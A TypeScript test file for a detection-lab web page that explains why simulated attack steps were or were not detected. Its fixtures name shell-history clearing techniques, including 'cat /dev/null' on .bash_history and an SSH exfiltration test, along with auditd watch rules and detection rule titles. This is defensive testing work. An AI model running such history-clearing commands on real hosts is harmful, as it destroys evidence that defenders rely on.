import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { act, cleanup, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter, Route, Routes, useLocation } from "react-router-dom";
import { describe, expect, it, vi } from "vitest";
import { api, type Delta, type DeltaStep, type DeltaSummary, type RecordingSummary } from "../src/lib/api";
import { activeProviderKind, backPath, candidates, draftKey, fixPath, modelWords, tieOf, triedFor } from "../src/lib/fix-step";
import { RUNNING_POLL_MS } from "../src/lib/recorded-runs";
import { readRecording, type Recording, type RuleLevel } from "../src/live/recording";
import { FixStepPage } from "../src/pages/FixStep";
import type { CatalogResponse } from "../src/types";
import { alert, at, event, recording as fixture, step } from "./live-fixture";

// A small recording in the shape the lab writes, and small comparisons of it.
// The page decides from what they hold; none of these is a result.

const SHA = "a".repeat(64);
const OTHER_SHA = "b".repeat(64);
const UNSEEN_BASIS = "nothing of the test was recorded besides its launcher's start";
const RULE_TEXT = ["title: Shell History File Truncated In Place", "level: high"];
const ECHO_GUID = "cbf506a5-dd78-43e5-be7e-a46b7c7a0a11";
const ECHO = { project: "Atomic Red Team", guid: ECHO_GUID, executor: "sh", elevated: false };

/** Four tests of one technique on one host watched by two sensors: unseen, seen, seen with a lab alert, and alerted. */
function smallRecording(options: { stable?: boolean } = {}): Recording {
  const base = fixture({
    steps: [
      step("1", 1, 2, { title: "Clear Bash history (echo)", test: ECHO, technique: { id: "T1070.003" }, outcome: "unseen", outcome_with_lab_rules: "unseen", visibility: { answer: "no telemetry", basis: UNSEEN_BASIS, events: 0 } }),
      step("2", 3, 4, { title: "Clear Bash history (cat dev/null)", technique: { id: "T1070.003" }, outcome: "seen", outcome_with_lab_rules: "seen", visibility: { answer: "telemetry only", basis: "the test left events", events: 2 } }),
      step("3", 5, 6, { title: "Clear Bash history (truncate)", technique: { id: "T1070.003" }, outcome: "seen", outcome_with_lab_rules: "alerted", visibility: { answer: "telemetry only", basis: "the test left events", events: 1 } }),
      step("4", 7, 8, { title: "Clear Bash history (rm)", technique: { id: "T1070.003" }, outcome: "alerted", outcome_with_lab_rules: "alerted", visibility: { answer: "alert", basis: "a published rule alerted", events: 1 } }),
    ],
    events: [
      { ...event("2-1", "2", 3.1), sensor: "auditd", kind: "openat", text: "/home/bluefire-lab/.bash_history", fields: { key: "shell-history", command: "cat /dev/null" } },
      event("2-2", "2", 3.2),
      { ...event("3-1", "3", 5.1), sensor: "auditd", kind: "openat", text: "/home/bluefire-lab/.zsh_history" },
      event("4-1", "4", 7.1),
    ],
    alerts: [
      alert("r2", "2", 3.1, ["2-1"], { counts: false, rule: { id: "hidden", title: "Use Of Hidden Paths Or Files", level: "low", origin: "pinned" } }),
      alert("l2", "2", 3.2, ["2-2"], { detector: "lab", counts: false, rule: { id: "lab-medium", title: "A Lab Rule Below Alert Level", level: "medium", origin: "lab" } }),
      alert("l3", "3", 5.1, ["3-1"], { detector: "lab", rule: { id: "truncated", title: "Shell History File Truncated In Place", level: "high", origin: "lab" } }),
      alert("a4", "4", 7.1, ["4-1"], { rule: { id: "deletion", title: "History File Deletion", level: "high", origin: "pinned" } }),
    ],
  });
  return {
    ...base,
    id: "rec-1",
    source: { ...base.source, tools: [{ name: "auditd", version: "1:3.1.2", role: "sensor" }], ...(options.stable === false ? {} : { setup: { sensors: { auditd: "c".repeat(64) } } }) },
    network: {
      ...base.network,
      sensors: [...base.network.sensors, { id: "auditd", name: "auditd 1:3.1.2", host: "target", records: "program starts and changes to the files its rules watch", audit_watches: { "shell-history": ["-a always,exit -F path=/home/bluefire-lab/.bash_history -F perm=aw"] } }],
      detectors: base.network.detectors.map((detector) => detector.id === "lab" ? {
        ...detector,
        commit: "f".repeat(40),
        verdicts: [
          { rule: "truncated", title: "Shell History File Truncated In Place", accepted: true, reason: "it alerted on every run with changed input arguments and on no ordinary activity", file: "lab/rules/linux/auditd/truncated.yml", lines: RULE_TEXT },
          { rule: "lab-medium", title: "A Lab Rule Below Alert Level", accepted: true, reason: "it matched no ordinary activity" },
          { rule: "daemon", title: "Program Named Like A System Daemon", accepted: false, reason: "not every procedure it alerts on ran again" },
        ],
      } : detector),
    },
  };
}

/** A recording shipped with the app. */
function shipped(name: string): Recording {
  return readRecording(JSON.parse(readFileSync(resolve(process.cwd(), `../bluefire/data/recordings/${name}.json`), "utf-8")));
}

/** The groups of rules a section shows, in order: each heading, with the titles of its cards sorted. */
function groupsOf(section: HTMLElement): [string, string[]][] {
  return within(section).getAllByRole("heading", { level: 3 }).map((heading) => {
    const box = heading.parentElement;
    const titles = box ? within(box).queryAllByRole("article").map((card) => card.getAttribute("aria-label") ?? "") : [];
    return [heading.textContent ?? "", titles.sort()];
  });
}

function summaryOf(id: string): RecordingSummary {
  return {
    id, title: "Four published tests on one Linux host", kind: "test list",
    source: { engine: "bluefire-lab", environment: "GitHub-hosted runner", started: at(0), finished: at(600) },
    score: { steps: 4, took_effect: 4, alerted: 1, seen: 2, unseen: 1, stopped: 0 },
    counts: { steps: 4, events: 4, alerts: 4 },
    origin: { kind: "imported", note: "Imported. BlueFire cannot confirm that the steps ran." },
    running: false,
  };
}

function movedStep(id: string, before: "unseen" | "seen", after: "seen" | "alerted", verdict: string, price?: string, role = "test"): DeltaStep {
  const side = (outcome: "unseen" | "seen" | "alerted") => ({ happened: "took effect", recorded: outcome === "unseen" ? "no telemetry" : "recorded", outcome: outcome === "alerted" ? "seen" : outcome, outcome_with_lab_rules: outcome } as const);
  return { id, role, title: "Clear Bash history (echo)", technique: "T1070.003", paired_by: "id", before: side(before), after: side(after), changed: ["outcome"], underneath: [], result: "better", verdict, ...(price ? { price } : {}) };
}

function delta(id: string, before: { id: string; sha256: string }, after: { id: string; sha256: string }, steps: DeltaStep[], title?: string): { summary: DeltaSummary; delta: Delta } {
  const sides = { before: { ...before, started: at(0) }, after: { ...after, started: at(10) } };
  const whole: Delta = {
    schema: "bluefire.delta/1", claim: "one pair of runs", ...sides, declared_change: "sensors:auditd", comparable: true, refused_because: [], differences: [], same_in_both: [],
    lab_code: { before: null, after: null, same: true }, judged: ["recorded", "outcome", "outcome_with_lab_rules"], control: { fields: ["happened"], same: 4, of: 4, varied: [] },
    counts: { same: 3, better: steps.length, worse: 0, changed: 0, "not attributable": 0, "without cause": 0, "no verdict": 0, paired: 4, new: 0, gone: 0 },
    unexplained: [], steps, new: [], gone: [], race: { why: "a test list has no race" },
  };
  return {
    delta: whole,
    summary: {
      id, claim: whole.claim, declared_change: whole.declared_change, comparable: true, refused_because: [], counts: whole.counts, ...sides,
      moved: steps.map((item) => ({ id: item.id, role: item.role, title: item.title, technique: item.technique, result: item.result, before: item.before, after: item.after })),
      recordings: { before: { ...summaryOf(before.id), ...(title ? { title } : {}) }, after: { ...summaryOf(after.id), ...(title ? { title } : {}) } },
      origin: { kind: "imported", note: "Imported. BlueFire did not make the comparison." },
    },
  };
}

const WATCH_PRICE = "price: published rules that alerted on ordinary activity: 2 before, 2 after; ordinary events: 8902 before, 8841 after";
const WATCH = delta("0000000000000001", { id: "rec-1", sha256: SHA }, { id: "rec-2", sha256: OTHER_SHA }, [movedStep("1", "unseen", "seen", `better: unseen to seen by the published rules; ${WATCH_PRICE}; one pair of runs`, WATCH_PRICE)]);
// The lab's line for a comparison of its own rules, as the shipped comparison of a new rule words it.
const RULE_PRICE = "price not counted: the lab's rules that matched ordinary activity are left out of the recording before it is written (before: The run accepted 1 of the 2 rules written in this repository.)";
const ELSEWHERE = delta("0000000000000002", { id: "rec-8", sha256: "d".repeat(64) }, { id: "rec-9", sha256: "e".repeat(64) }, [movedStep("1", "seen", "alerted", `better: seen to alerted with the lab's rules; ${RULE_PRICE}`, RULE_PRICE)]);
/** The same comparison when it names one new rule of the lab's own and the run after accepted it. */
function keptRule(pair: { summary: DeltaSummary; delta: Delta }): { summary: DeltaSummary; delta: Delta } {
  const rules: Delta["lab_rules"] = [{ rule: "r1", title: "Shell History File Truncated In Place", change: "new", before: null, after: { accepted: true, reason: "it alerted on no ordinary activity" } }];
  return { summary: { ...pair.summary, declared_change: "detectors:lab", lab_rules: rules }, delta: { ...pair.delta, declared_change: "detectors:lab", lab_rules: rules } };
}

/** A comparison of two later runs whose recordings give their steps stable ids, which moved the steps given. */
function later(id: string, steps: DeltaStep[], title?: string) {
  return delta(id, { id: `${id}-base`, sha256: "d".repeat(64) }, { id: `${id}-head`, sha256: "e".repeat(64) }, steps, title);
}

const MOVED = "better: seen to alerted with the lab's rules";
/** The echo test as the list gives it, and its reruns, each moved by a comparison of later runs of the same list. */
const PLAIN = later("0000000000000003", [movedStep("test:cbf506a5", "seen", "alerted", MOVED)]);
const VARIANT = later("0000000000000004", [movedStep("variant:cbf506a5:27e9e5", "seen", "alerted", MOVED, undefined, "variant")]);
const HARDENED = later("0000000000000005", [movedStep("hardened:cbf506a5:tmp-noexec", "seen", "alerted", MOVED, undefined, "hardened")]);
const WITH_ARGUMENTS = later("0000000000000006", [movedStep("test:cbf506a5:85163a", "seen", "alerted", MOVED)]);
const OTHER_LIST = later("0000000000000007", [movedStep("test:cbf506a5", "seen", "alerted", MOVED)], "Another list of tests");

function catalog(kind: string | null): CatalogResponse {
  return {
    schema_version: "bluefire.catalog-response.v1", modes: [],
    ai: { enabled: kind !== null, independent_of_mode: true, authority: "proposal_only", ...(kind ? { active_provider: `${kind}-provider`, providers: [{ provider_id: `${kind}-provider`, kind, model: "m" }] } : {}) },
  } as unknown as CatalogResponse;
}

function Address() {
  const location = useLocation();
  return <output aria-label="Address">{`${location.pathname}${location.search}`}</output>;
}

function mount(stepId: string, options: { recording?: Recording; kind?: string | null; catalogFails?: boolean; running?: boolean; pairs?: { summary: DeltaSummary; delta: Delta }[]; search?: string; file?: string } = {}) {
  const recording = options.recording ?? smallRecording();
  const pairs = options.pairs ?? [WATCH, ELSEWHERE];
  // The service names a recording's file only once it is finished.
  vi.spyOn(api, "recording").mockResolvedValue(options.running ? { summary: { ...summaryOf(recording.id), running: true }, recording } : { summary: summaryOf(recording.id), recording, sha256: SHA });
  // Another file kept under the same id, opened by its SHA-256.
  vi.spyOn(api, "recordingFile").mockResolvedValue({ summary: summaryOf(recording.id), recording });
  vi.spyOn(api, "recordingDeltas").mockResolvedValue({ deltas: pairs.map((item) => item.summary), unreadable_count: 0, omitted_count: 0 });
  vi.spyOn(api, "recordingDelta").mockImplementation(async (id) => {
    const found = pairs.find((item) => item.summary.id === id);
    if (!found) throw new Error("not found");
    return found;
  });
  const catalogFetch = options.catalogFails
    ? vi.spyOn(api, "catalog").mockRejectedValue(new Error("The service did not answer."))
    : vi.spyOn(api, "catalog").mockResolvedValue(catalog(options.kind ?? null));
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  const address = `${fixPath(recording.id, options.file, stepId)}${options.search ?? ""}`;
  const view = render(<QueryClientProvider client={client}><MemoryRouter initialEntries={[address]}>
    <Routes>
      <Route path="/runs/recorded/:recordingId/fix/:stepId" element={<FixStepPage />} />
      <Route path="/runs/recorded/:recordingId/:file/fix/:stepId" element={<FixStepPage />} />
      <Route path="*" element={<p>Elsewhere</p>} />
    </Routes>
    <Address />
  </MemoryRouter></QueryClientProvider>);
  return { user: userEvent.setup(), catalogFetch, view };
}

describe("the page for fixing a step", () => {
  it("leads with where to start and what was already tried, then the evidence, the draft, the model's place and how a rerun is made", async () => {
    mount("2");
    await screen.findByRole("heading", { level: 1, name: "Clear Bash history (cat dev/null)" });
    const sections = screen.getAllByRole("heading", { level: 2 }).map((heading) => heading.textContent ?? "");
    const at = (name: string) => sections.findIndex((text) => text.startsWith(name));
    const order = ["Where to start", "What was already tried", "What was recorded", "Rules that matched it", "A draft", "Running it again"].map(at);
    expect(order.every((index) => index >= 0)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
    // The model's place comes between the draft and how a rerun is made.
    const model = screen.getByRole("complementary", { name: "The model's place" });
    expect(screen.getByRole("region", { name: "A draft" }).compareDocumentPosition(model) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    expect(model.compareDocumentPosition(screen.getByRole("region", { name: "Running it again" })) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it("for a step nobody saw, says to start with a sensor's settings, keeps how the recording knows behind one line, and offers no rule editor", async () => {
    const { user } = mount("1");
    expect(await screen.findByRole("heading", { level: 1, name: "Clear Bash history (echo)" })).toBeVisible();
    const start = screen.getByRole("region", { name: "Where to start" });
    // The recording says its launcher's start was recorded, and the page says so too, as analyse mode does.
    expect(start).toHaveTextContent("Nothing of this test was recorded besides its launcher's start. Start with a sensor's settings: a rule can only match what a sensor records.");
    expect(start).toHaveTextContent("lab/sensors/");

    const recorded = screen.getByRole("region", { name: /^What was recorded/ });
    // Both sensors of the host, with what each records.
    expect(within(recorded).getByRole("article", { name: "Sensor auditd" })).toHaveTextContent("0 events of this step");
    expect(within(recorded).getByRole("article", { name: "Sensor auditd" })).toHaveTextContent("1:3.1.2");
    expect(within(recorded).getByRole("article", { name: "Sensor auditd" })).toHaveTextContent("shell-history");
    // The recording's own words and each sensor's settings are one quiet line away, not on the page until it opens.
    expect(within(recorded).getByText(UNSEEN_BASIS)).not.toBeVisible();
    expect(within(recorded).getByText("c".repeat(64))).not.toBeVisible();
    expect(screen.queryByText(/recording's basis/i)).toBeNull();
    await user.click(within(recorded).getByText("How we know"));
    expect(within(recorded).getByText("What the recording says")).toBeVisible();
    expect(within(recorded).getByText(UNSEEN_BASIS)).toBeVisible();
    expect(within(recorded).getByText("c".repeat(64))).toBeVisible();
    expect(within(recorded).getByText(/The shell the lab starts each test from/)).toBeVisible();
    expect(within(recorded).getByText("This recording does not say which settings it loaded.")).toBeVisible();
    // The other runs of its technique.
    expect(within(recorded).getByRole("heading", { level: 3, name: /^Other tests of the same technique in this run/ })).toBeVisible();
    const rm = within(recorded).getByRole("link", { name: /Clear Bash history \(rm\)/ });
    expect(rm).toHaveTextContent("test 4");
    expect(rm).toHaveTextContent("alerted");
    expect(rm).toHaveAttribute("href", "/runs/recorded/rec-1?step=4&at=0&paused=1&mode=analyse&select=4");
    // A test the published rules only saw and the lab's own rules alerted on reads both, as the step's own line does.
    const truncate = within(recorded).getByRole("link", { name: /Clear Bash history \(truncate\)/ });
    expect(truncate).toHaveTextContent("seen, no alert");
    expect(truncate).toHaveTextContent("with the lab's rules: alerted, not in the score");
    expect(rm).not.toHaveTextContent("with the lab's rules");

    expect(screen.queryByRole("textbox")).toBeNull();
    expect(screen.queryByRole("region", { name: "A draft" })).toBeNull();
    expect(screen.queryByRole("region", { name: "Rules that matched it" })).toBeNull();
  });

  it("for a step seen with no alert, shows what matched it below alert level with what the recording says of the lab's rules, and an empty draft", async () => {
    mount("2");
    const start = await screen.findByRole("region", { name: "Where to start" });
    // The one published rule that matched it is the one to start from.
    expect(start).toHaveTextContent('A sensor recorded this test, but no rule raised an alert. To alert here, start from the rule "Use Of Hidden Paths Or Files": it matched this step at low level.');
    const matched = screen.getByRole("region", { name: "Rules that matched it" });
    expect(within(matched).getByRole("heading", { level: 3, name: "Published rules below alert level: for review" })).toBeVisible();
    const published = within(matched).getByRole("article", { name: "Use Of Hidden Paths Or Files" });
    expect(published).toHaveTextContent("review · low");
    expect(published).toHaveTextContent("published");
    const lab = within(matched).getByRole("article", { name: "A Lab Rule Below Alert Level" });
    expect(lab).toHaveTextContent("accepted");
    expect(lab).toHaveTextContent("it matched no ordinary activity");
    // A rule this run did not accept: its matches are not in the recording, and the page says so.
    expect(matched).toHaveTextContent("Rules this run did not accept, so their matches are left out: Program Named Like A System Daemon (not every procedure it alerts on ran again).");

    // What was recorded, by sensor, with the audit key and the command an event names.
    const auditd = screen.getByRole("article", { name: "Sensor auditd" });
    expect(within(auditd).getByRole("table")).toHaveTextContent("/home/bluefire-lab/.bash_history");
    expect(within(auditd).getByRole("table")).toHaveTextContent("audit key shell-history by cat /dev/null");

    const draft = screen.getByRole("textbox", { name: "Your rule" });
    expect(draft).toHaveValue("");
    expect(draft).not.toHaveAttribute("placeholder");
    expect(screen.getByText("Kept in this browser only. The file in the repository is what runs.")).toBeVisible();
    // What a rule file needs to be picked up, in one line the editor points to: the folder of its kind, not anywhere.
    expect(draft).toHaveAccessibleDescription(/in the folder of its kind under lab\/rules\/linux\/: .*auditd\/ for auditd/);
    // Every condition the lab applies before a run accepts a rule.
    expect(draft).toHaveAccessibleDescription(/A run accepts it only if it is at level high or critical, it alerts on at least one published test, every test it alerts on has a rerun with changed input arguments that took effect, it alerts on every such rerun, and it matches no event of ordinary activity\./);
  });

  it("names the published rule to start from, chosen as the step's caption chooses it, says why, and sets informational matches apart as analyse mode does", async () => {
    const rule = (id: string, title: string, level: RuleLevel) => ({ id, title, level, origin: "pinned" as const });
    const base = fixture({
      steps: [step("1", 1, 2, { title: "Exfiltration Over Alternative Protocol - SSH", outcome: "seen", visibility: { answer: "telemetry only", basis: "4 archived events tied to the step", events: 4 } })],
      events: ["1-1", "1-2", "1-3", "1-4", "1-5"].map((id, index) => event(id, "1", 1.1 + index / 10)),
      alerts: [
        alert("m1", "1", 1.1, ["1-1"], { counts: false, rule: rule("554", "File added to the system.", "low") }),
        alert("m2", "1", 1.2, ["1-2"], { counts: false, rule: rule("5715", "sshd: authentication success.", "informational") }),
        alert("m3", "1", 1.3, ["1-3"], { counts: false, rule: rule("553", "File deleted.", "medium") }),
        alert("m4", "1", 1.4, ["1-4"], { counts: false, rule: rule("550", "Integrity checksum changed.", "medium") }),
        alert("m5", "1", 1.5, ["1-5"], { counts: false, rule: rule("5501", "PAM: Login session opened.", "informational") }),
      ],
    });
    // Two rules at the highest level: the one that matched less ordinary activity is the one to start from.
    const run: Recording = { ...base, id: "rec-5", ordinary: { events: 900, matches: [
      { rule: "File added to the system.", level: "low", count: 93 },
      { rule: "sshd: authentication success.", level: "informational", count: 7 },
      { rule: "File deleted.", level: "medium", count: 51 },
      { rule: "Integrity checksum changed.", level: "medium", count: 38 },
    ] } };
    mount("1", { recording: run, pairs: [] });

    const start = await screen.findByRole("region", { name: "Where to start" });
    expect(start).toHaveTextContent('A sensor recorded this test, but no rule raised an alert. To alert here, start from the rule "Integrity checksum changed": it matched this step at medium level, and 38 events of ordinary activity too.');
    expect(start).toHaveTextContent("Of the 5 published rules that matched it below alert level, it is the one at the highest level; a tie goes to the one that matched least ordinary activity.");
    expect(start).not.toHaveTextContent("Start with a rule that matches what the sensor recorded");

    const matched = screen.getByRole("region", { name: "Rules that matched it" });
    const group = (name: string) => {
      const heading = within(matched).getByRole("heading", { level: 3, name });
      const box = heading.parentElement;
      if (!box) throw new Error(`No group under ${name}.`);
      return within(box).getAllByRole("article").map((card) => card.getAttribute("aria-label"));
    };
    expect(group("Published rules below alert level: for review")).toEqual(["File added to the system.", "File deleted.", "Integrity checksum changed."]);
    expect(group("Published rules at informational level: nobody reviews them")).toEqual(["sshd: authentication success.", "PAM: Login session opened."]);
    // An informational match is called informational, never one for review.
    expect(within(matched).getByRole("article", { name: "sshd: authentication success." })).toHaveTextContent("informational");
    expect(matched).not.toHaveTextContent(/review · informational/i);
    expect(within(matched).getByRole("article", { name: "Integrity checksum changed." })).toHaveTextContent("review · medium");
  });

  it("offers no draft while the recording is still running, since a draft is kept for one finished file", async () => {
    mount("2", { running: true });
    const draft = await screen.findByRole("region", { name: "A draft" });
    expect(draft).toHaveTextContent("This recording is still running.");
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  it("asks again while the recording is running, and shows the step of the finished recording once the run has finished", async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
    try {
      // A comparison that names the file this recording becomes once it has finished.
      const rule = delta("0000000000000008", { id: "rec-1", sha256: SHA }, { id: "rec-1", sha256: OTHER_SHA }, [movedStep("2", "seen", "alerted", MOVED)]);
      mount("2", { running: true, pairs: [rule] });
      expect(await screen.findByRole("region", { name: "A draft" })).toHaveTextContent("This recording is still running.");
      expect(screen.getByRole("region", { name: /^What was already tried/ })).toHaveTextContent("This recording is still running");
      // The run finishes: the service's next answer names the finished file.
      vi.mocked(api.recording).mockResolvedValue({ summary: summaryOf("rec-1"), recording: smallRecording(), sha256: SHA });
      await act(async () => { await vi.advanceTimersByTimeAsync(RUNNING_POLL_MS); });
      expect(await screen.findByRole("textbox", { name: "Your rule" })).toHaveValue("");
      const tried = screen.getByRole("region", { name: /^What was already tried/ });
      expect(tried).not.toHaveTextContent("This recording is still running");
      expect(await within(tried).findByRole("link", { name: "Open the comparison at this step" })).toBeVisible();
    } finally {
      vi.useRealTimers();
    }
  });

  it("keeps a draft per recording and step in this browser, and never fills one in", async () => {
    const first = mount("2");
    const draft = await screen.findByRole("textbox", { name: "Your rule" });
    await first.user.type(draft, "title: mine");
    expect(window.localStorage.getItem(draftKey("rec-1", SHA, "2"))).toBe("title: mine");
    first.view.unmount();

    // The same step again: the draft is back as it was typed.
    mount("2");
    expect(await screen.findByRole("textbox", { name: "Your rule" })).toHaveValue("title: mine");
    // Another file of the same id, or another step, has a draft of its own.
    expect(draftKey("rec-1", OTHER_SHA, "2")).not.toBe(draftKey("rec-1", SHA, "2"));
    expect(window.localStorage.getItem(draftKey("rec-1", SHA, "1"))).toBeNull();
  });

  it("for a step a rule of the lab's own alerted on, shows that rule with how the run judged it and its text, and offers no draft", async () => {
    mount("3");
    const start = await screen.findByRole("region", { name: "Where to start" });
    expect(start).toHaveTextContent("One of the lab's own rules alerted on it, which the score does not count. The score counts published rules only, and none of those alerted.");
    const matched = screen.getByRole("region", { name: "Rules that matched it" });
    expect(matched).toHaveTextContent("The rule that raised the lab alert");
    // Where the run loaded the rule from, as the recording says; not a claim about the repository today.
    expect(matched).toHaveTextContent("The run loaded it from commit ffffffff.");
    expect(matched).not.toHaveTextContent(/in the repository already/);
    const rule = within(matched).getByRole("article", { name: "Shell History File Truncated In Place" });
    expect(rule).toHaveTextContent("lab alert · high");
    expect(rule).toHaveTextContent("accepted");
    expect(rule).toHaveTextContent("lab/rules/linux/auditd/truncated.yml");
    expect(within(rule).getByLabelText("The text of the rule Shell History File Truncated In Place")).toHaveTextContent("title: Shell History File Truncated In Place level: high");
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  it("for a step a lab rule alerted on in an older recording that says how the run judged the lab's rules only in a note, shows that note whole and no card says the recording is silent", async () => {
    // The run on one Linux machine: its detector `lab` carries no verdicts, and one of its notes says how the run judged its rules.
    const linux = shipped("lab-linux-host");
    const note = linux.notes.find((item) => item.startsWith("The run accepted "));
    if (!note) throw new Error("The shipped run's notes should say how the run judged the lab's rules.");
    mount("45", { recording: linux, pairs: [] });
    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(matched).toHaveTextContent("The rule that raised the lab alert");
    expect(within(matched).getByText(/^This recording says of the lab's own rules:/)).toHaveTextContent(`This recording says of the lab's own rules: ${note}`);
    expect(matched).not.toHaveTextContent("This recording does not say how the run judged this rule.");
    // A step to start a rule for shows the same note.
    cleanup();
    mount("7", { recording: linux, pairs: [] });
    const start = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(start).toHaveTextContent(`This recording says of the lab's own rules: ${note}`);
    expect(start).not.toHaveTextContent("This recording does not say how the run judged this rule.");
  });

  it("for a step a lab rule alerted on in a recording that carries how the run judged each rule, shows that and not the note", async () => {
    const head = shipped("lab-rule-history-truncated-head");
    mount("test:cbf506a5", { recording: head, pairs: [] });
    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    const rule = within(matched).getByRole("article", { name: "Shell History File Truncated In Place" });
    expect(rule).toHaveTextContent("accepted");
    expect(within(rule).getByLabelText("The text of the rule Shell History File Truncated In Place")).toBeVisible();
    expect(matched).toHaveTextContent("Rules this run did not accept, so their matches are left out: Program Named Like A System Daemon Run From A Temporary Folder");
    expect(matched).not.toHaveTextContent("This recording says of the lab's own rules");
    expect(matched).not.toHaveTextContent("This recording does not say how the run judged this rule.");
  });

  it("for a step a published rule alerted on, shows the rule that alerted", async () => {
    mount("4");
    const start = await screen.findByRole("region", { name: "Where to start" });
    expect(start).toHaveTextContent("A published rule raised an alert on it. There is nothing to fix here.");
    expect(within(screen.getByRole("region", { name: "Rules that matched it" })).getByRole("article", { name: "History File Deletion" })).toHaveTextContent("alert · high");
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  it("for a step of a run that two defenses judged, shows it as the first defense judged it, with nothing of the second", async () => {
    // The first defense has Sysmon and the published rules, and saw the test; the second has a packet capture and Sigma's rules too, and alerted on it.
    const seen = { visibility: { answer: "telemetry only", basis: "one event", events: 1 }, outcome: "seen", first_event: at(1.1) } as const;
    const alerted = { visibility: { answer: "alert", basis: "an event, a packet and a rule", events: 2 }, outcome: "alerted", first_event: at(1.1), first_alert: at(1.2) } as const;
    const base = fixture({
      steps: [step("1", 1, 2, { title: "Clear Bash history (rm)", ...seen })],
      events: [event("1-1", "1", 1.1), { ...event("1-2", "1", 1.2), sensor: "capture", kind: "packet", text: "a packet the capture kept" }],
      alerts: [alert("on-the-packet", "1", 1.2, ["1-2"], { detector: "sigma", rule: { id: "s1", title: "Sigma rule on a packet", level: "high", origin: "pinned" } })],
    });
    const score = { ...base.score, took_effect: 1, seen: 1 };
    const judged: Recording = {
      ...base,
      id: "rec-6",
      network: {
        ...base.network,
        sensors: [...base.network.sensors, { id: "capture", name: "Packet capture", host: "target", records: "packets" }],
        detectors: [...base.network.detectors, { id: "sigma", name: "Sigma rules", rules: 3, when: "after the run" }],
      },
      score,
      defenses: [
        { id: "sysmon-alone", name: "Sysmon with the published rules", sensors: ["sysmon"], detectors: ["pinned"], steps: { "1": seen }, score },
        { id: "with-capture", name: "Sysmon, a packet capture and Sigma's rules", sensors: ["sysmon", "capture"], detectors: ["sigma"], steps: { "1": alerted }, score: { ...score, seen: 0, alerted: 1 } },
      ],
    };
    mount("1", { recording: judged, pairs: [] });

    const recorded = await screen.findByRole("region", { name: /^What was recorded/ });
    // The first defense's one sensor with its one event of the test, and its verdict: seen, with no alert.
    expect(within(recorded).getAllByRole("article").map((card) => card.getAttribute("aria-label"))).toEqual(["Sensor Sysmon"]);
    expect(within(recorded).getByRole("article", { name: "Sensor Sysmon" })).toHaveTextContent("1 event of this step");
    expect(screen.getByRole("region", { name: "Where to start" })).toHaveTextContent("A sensor recorded this test, but no rule raised an alert.");
    // Nothing of the second defense: not its sensor, its packet, its rule set or its alert.
    expect(screen.queryAllByText(/Packet capture|a packet the capture kept|Sigma rules|Sigma rule on a packet/)).toEqual([]);
  });

  it("for step 1 of the attack path, which a published rule alerted on, lists all nine rules that matched it, each in its group", async () => {
    mount("s01", { recording: shipped("lab-range-one-path"), pairs: [] });
    const start = await screen.findByRole("region", { name: "Where to start" });
    expect(start).toHaveTextContent("A published rule raised an alert on it. There is nothing to fix here.");
    expect(groupsOf(screen.getByRole("region", { name: "Rules that matched it" }))).toEqual([
      ["The rule that raised the alert", ["Multiple authentication failures followed by a success."]],
      ["Published rules below alert level: for review", [
        "PAM: Multiple failed logins in a small period of time.",
        "PAM: User login failed.",
        "sshd: Attempt to login using a non-existent user",
        "sshd: authentication failed.",
        "sshd: brute force trying to get access to the system. Authentication failed.",
        "sshd: brute force trying to get access to the system. Non existent user.",
      ]],
      ["Published rules at informational level: nobody reviews them", ["PAM: Login session closed.", "PAM: Login session opened."]],
    ]);
    expect(screen.getByRole("article", { name: "sshd: Attempt to login using a non-existent user" })).toHaveTextContent("review · low");
  });

  it("counts an event of a rule once where its match names it twice, as analyse mode's detail does", async () => {
    // Test 42 of a later run of the 60 tests: its one match of this rule names the event 45-3 twice.
    mount("test:23d348f3", { recording: shipped("lab-pair-history-watch-after"), pairs: [] });
    expect(await screen.findByRole("article", { name: "Use Of Hidden Paths Or Files" })).toHaveTextContent("published · on 1 event · 3 events in ordinary activity");
  });

  it("for a test of the run on one Linux machine a published rule alerted on, lists the rule below alert level and the lab's rule, and ends with the recording's note on the lab's rules", async () => {
    const linux = shipped("lab-linux-host");
    const note = linux.notes.find((item) => item.startsWith("The run accepted "));
    if (!note) throw new Error("The shipped run's notes should say how the run judged the lab's rules.");
    // Test 39 (step 42).
    mount("42", { recording: linux, pairs: [] });
    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(groupsOf(matched)).toEqual([
      ["The rule that raised the alert", ["Binary Padding - Linux"]],
      ["The lab's own rules that matched", ["Shell History File Emptied"]],
      ["Published rules below alert level: for review", ["Suspicious History File Operations - Linux"]],
    ]);
    expect(screen.getByRole("region", { name: "Where to start" })).toHaveTextContent("A published rule raised an alert on it. There is nothing to fix here.");
    // The lab's rule has a card: the section says how the run judged it, in the recording's note, as the other pages do.
    expect(matched.lastElementChild).toHaveTextContent(`This recording says of the lab's own rules: ${note}`);
    expect(matched).not.toHaveTextContent("This recording does not say how the run judged this rule.");
  });

  it("for a test a lab rule alerted on whose launcher line a published rule matched, lists that match last, as the page of a seen test does", async () => {
    // Test 11 (step 14) of the run on one Linux machine.
    mount("14", { recording: shipped("lab-linux-host"), pairs: [] });
    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(groupsOf(matched)).toEqual([
      ["The rule that raised the lab alert", ["Systemd Unit File Written By A Shell"]],
      ["Published rules below alert level: for review", ["Service Reload or Start - Linux"]],
      ["Matched only the line that starts the test, which never counts", ["Execution Of Script Located In Potentially Suspicious Directory"]],
    ]);
    expect(within(matched).getByRole("article", { name: "Execution Of Script Located In Potentially Suspicious Directory" })).toHaveTextContent("launcher line");
  });

  it("keeps the groups of a seen test's page, empty ones and all", async () => {
    // Test 4 (step 7) of the run on one Linux machine: matched only on its launcher line.
    mount("7", { recording: shipped("lab-linux-host"), pairs: [] });
